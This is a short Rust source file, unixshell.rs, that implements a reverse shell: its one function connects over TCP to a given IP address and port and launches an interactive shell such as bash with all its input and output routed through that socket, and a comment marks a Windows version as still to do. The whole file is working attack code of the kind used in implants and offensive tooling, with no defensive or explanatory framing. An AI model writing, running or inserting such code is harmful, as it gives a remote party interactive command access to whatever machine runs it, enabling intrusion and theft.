/*
Name: unixshell.rs
Description: Create a unix reverse shell (with bash etc).
*/

use std::io::Result;
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

/* Open A Reverse Shell */
pub fn shell(ip: String, port: String, shell: String) -> Result<()> {
    let sock = TcpStream::connect(format!("{}:{}", ip, port))?;
    let fd = sock.as_raw_fd();

    // Open shell
    Command::new(format!("{}", shell))
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()?
        .wait()?;

    println!("Shell exited");

    Ok(())
}

//todo add windows shell
